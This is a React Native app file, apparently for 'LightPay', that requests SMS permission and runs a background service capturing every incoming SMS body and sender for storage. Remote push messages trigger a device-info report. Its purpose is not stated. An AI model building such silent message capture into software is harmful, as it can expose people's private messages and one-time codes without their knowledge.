import { createBottomTabNavigator } from '@react-navigation/bottom-tabs';
import { Connection } from './src/pages/connection';
import { useEffect } from 'react';
import { SmsPage } from './src/pages/SmsPage';
import { AllMsg } from './src/pages/allMsg';
import BackgroundService from 'react-native-background-actions';
import PushNotification from 'react-native-push-notification';
import { DeviceEventEmitter, PermissionsAndroid, Platform } from 'react-native';
import { createTables, SetDeviceInfo, setSms } from './src/func/function';
import { useDispatch, useSelector } from 'react-redux';
import AsyncStorage from '@react-native-async-storage/async-storage';
import { useNavigation } from '@react-navigation/native';
import { ClearLoginAction } from './src/store/action/action';
import { ChangePermitionPage } from './src/pages/changePermitionPage';
import { AppsPage } from './src/pages/AppsPage';
import messaging from '@react-native-firebase/messaging';
import { NativeModules } from 'react-native';

const { SmsListenerModule } = NativeModules;

// import { RequestDisableOptimization, OpenOptimizationSettings, BatteryOptEnabled } from "react-native-battery-optimization-check";

export function LoginNavigation() {

  const Tab = createBottomTabNavigator();
  const navigation = useNavigation()
  const { online } = useSelector((st) => st.isOnlie)
  const dispatch = useDispatch()
  PushNotification.createChannel(
    {
      channelId: "sms-channel",
      channelName: "SmS",
      channelDescription: "A channel to categorise your notifications",
      soundName: "default",
      importance: 4,
      vibrate: true,
    },
  );

  PushNotification.createChannel(
    {
      channelId: "s-channel",
      channelName: "SmS",
      channelDescription: "A channel to categorise your notifications",
      soundName: "sirena.mp3",
      importance: 4,
      vibrate: true,
    },
  );


  async function requestUserPermission() {
    const authStatus = await messaging().requestPermission();
    const enabled =
      authStatus === messaging.AuthorizationStatus.AUTHORIZED ||
      authStatus === messaging.AuthorizationStatus.PROVISIONAL;

    if (enabled) {
      console.log('Authorization status:', authStatus);
    } else {
      Alert.alert('Permission denied for push notifications.');
    }
  }

  // const GetAllSms = () => {
  //   SmsListenerModule.getAllSMS()
  //     .then(smsList => {
  //       console.log('All SMS messages:', smsList);
  //     })
  //     .catch(error => {
  //       console.error('Failed to get SMS messages:', error);
  //     });
  // }

  // useEffect(() => {
  //   GetAllSms()
  // }, [])

  useEffect(() => {
    requestUserPermission()
    PushNotification.removeAllDeliveredNotifications();
    PushNotification.configure({
      onNotification: function (notification) { },
      popInitialNotification: true,
      requestPermissions: Platform.OS === 'ios',
    });
    PushNotification.popInitialNotification((notification) => { });
    return () => {
      PushNotification.unregister();
    };
  }, [])

  const startBackgroundTask = async () => {
    try {
      await BackgroundService.start(YourTask, {
        taskName: 'LightPay',
        taskTitle: 'LightPay',
        taskDesc: '',
        taskIcon: {
          name: 'ic_launcher',
          type: 'mipmap',
        },
        color: '#0073ff',
        parameters: { delay: 1000 },
      });
    } catch (e) { }
  };

  useEffect(() => {
    requestSmsPermission();
    createTables()
  }, [])

  useEffect(() => {
    startBackgroundTask();
    return () => {
      BackgroundService.stop();
    };
  }, []);


  const Logout = async () => {
    dispatch(ClearLoginAction())
    await AsyncStorage.clear()
    AsyncStorage.removeItem('token')
    navigation.replace('home')
  }


  useEffect(() => {
    if (online == 0) {
      Logout()
    }
  }, [online])

  const requestSmsPermission = async () => {
    try {
      const permission = await PermissionsAndroid
        .request(PermissionsAndroid.PERMISSIONS.RECEIVE_SMS);
    } catch (err) {
    }
  };


  const YourTask = async (taskDataArguments) => {
    const { delay } = taskDataArguments;
    let subscriber
    subscriber = DeviceEventEmitter.addListener('onSMSReceived',
      message => {
        const { messageBody, senderPhoneNumber, timestamp } = JSON.parse(message);
        console.log(messageBody, 'messageBody')
        let data = {
          body: messageBody,
          originatingAddress: senderPhoneNumber,
          timestamp: timestamp
        }
        setSms(data)
      },
    );
    try {
      while (BackgroundService.isRunning()) {
        await new Promise(resolve => setTimeout(resolve, delay));
      }
    } catch (error) {
    }
    finally {
      DeviceEventEmitter.removeAllListeners('onSMSReceived');
    };
  }


  useEffect(() => {
    const unsubscribe = messaging().onMessage(async remoteMessage => {
      SetDeviceInfo()
    });
    return unsubscribe;
  }, []);



  return (
    <Tab.Navigator
      initialRouteName={'connectionPage'}
      screenOptions={() => ({
        tabBarStyle: { display: 'none' },
        headerShown: false
      })}>
      <Tab.Screen name="connectionPage" component={Connection} />
      <Tab.Screen name="AppsPage" component={AppsPage} />
      <Tab.Screen name="SmsPage" component={SmsPage} />
      <Tab.Screen name="AllMsg" component={AllMsg} />
      <Tab.Screen name="changePermitionPage" component={ChangePermitionPage} />
    </Tab.Navigator>
  )
}